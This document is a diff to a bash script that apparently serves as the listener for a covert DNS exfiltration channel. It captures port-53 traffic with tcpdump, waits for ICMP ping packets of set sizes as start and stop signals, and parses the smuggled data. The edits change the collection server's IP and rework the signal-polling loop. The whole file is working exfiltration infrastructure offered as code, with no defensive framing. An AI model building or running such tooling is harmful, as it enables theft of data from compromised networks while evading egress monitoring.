@@ -2,7 +2,7 @@
 
 p="/root/xfil/ping.out"
 x="/root/xfil/xfil.tcp"
-svr=192.168.181.173
+svr=192.168.181.210
 
 
 listen_for_signal()
@@ -16,12 +16,30 @@ start_catch()
   echo "Starting catch..."
   tcpdump -vvv -s 0 -l -n port 53 > $x &
   echo "Waiting for dns xfil to complete..."
-  sleep 30 ## may want to extend this, depending on data size...
-  fsize=$(du -sb $x | awk '{ print $1 }')
-  if [ $fsize -gt 10 ]; then
-    echo caught exfil request
-    parse_data $x
-  fi
+  
+
+
+
+#  fsize=$(du -sb $x | awk '{ print $1 }')
+#  if [ $fsize -gt 10 ]; then
+#    echo caught exfil request
+#    parse_data $x
+#  fi
+
+
+# waiting until DNS xfil ends....ping request from client
+
+    fsize=1
+     until [ $fsize -gt 10 ]; do
+      echo "Catching DNS xfil..."
+      sleep 10
+      awk '/126|136|146/' $p > $p.awk.stop
+      fsize=$(du -sb $p.awk.stop | awk '{ print $1 }')
+      done
+ 
+     parse_data $x
+     stop_catch
+
 }
 
 stop_catch()
@@ -42,16 +60,9 @@ parse_signal()
     fsize=$(du -sb $p.awk.start | awk '{ print $1 }')
      if [ $fsize -gt 10 ]; then
       echo "Caught DNS xfil request"
-      start_catch 
+      start_catch $p 
      fi
     
-    awk '/126|136|146/' $p > $p.awk.stop
-    fsize=$(du -sb $p.awk.stop | awk '{ print $1 }')
-     if [ $fsize -gt 10 ]; then
-      echo "Caught DNS xfil stop"
-      stop_catch
-     fi
-
   fi
 
 }
@@ -76,7 +87,9 @@ parse_data()
 ###MAIN
 #
 #listen_for_signal $file
-echo starting....
+echo Starting....
+
+tcpdump -i eth0 'icmp[icmptype] = icmp-echo' -l |tee $p&
 
 while [ 1=1 ]; do
   parse_signal $file
